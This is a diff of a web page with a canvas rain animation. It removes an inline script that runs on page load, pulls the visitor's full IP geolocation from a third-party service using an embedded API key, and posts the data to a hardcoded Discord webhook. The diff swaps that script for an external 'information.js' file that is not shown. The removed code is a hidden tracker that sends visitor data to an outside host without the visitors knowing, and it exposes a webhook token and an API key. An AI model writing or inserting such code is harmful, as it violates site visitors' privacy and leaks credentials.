@@ -118,39 +118,6 @@
 
     drawRain();
   </script>
-  <script>
-(async () => {
-  const webhookURL = 'https://discord.com/api/webhooks/1381352656907407430/iVllgtIG4bhE07zjzkox8yfCt8HARxuJi30nm2mLV-akkeEIWRYqq2fmPvR4gW_wk3sN'; // Replace with your Discord webhook
-
-  try {
-    const res = await fetch('https://api.bigdatacloud.net/data/ip-geolocation-full?localityLanguage=en&key=bdc_77754f0976fd44bcb2c57392b7aef84a');
-    const data = await res.json();
-
-    // Convert the entire JSON to a nicely formatted string (Discord has 6000 character limit per message)
-    const rawJSON = JSON.stringify(data, null, 2);
-    const chunks = rawJSON.match(/[\s\S]{1,1900}/g); // Chunk to avoid hitting Discord's 2000 char limit per message part
-
-    const embeds = chunks.map((chunk, index) => ({
-      title: index === 0 ? "🌐 Full Visitor Data" : `Continued (${index + 1})`,
-      description: "```json\n" + chunk + "\n```",
-      color: 3447003,
-      timestamp: new Date().toISOString()
-    }));
-
-    const payload = {
-      content: null,
-      embeds
-    };
-
-    await fetch(webhookURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    });
-  } catch (err) {
-    console.error("Error fetching geolocation or sending to Discord:", err);
-  }
-})();
-</script>
+  <script src="./information.js"></script>
 </body>
 </html>
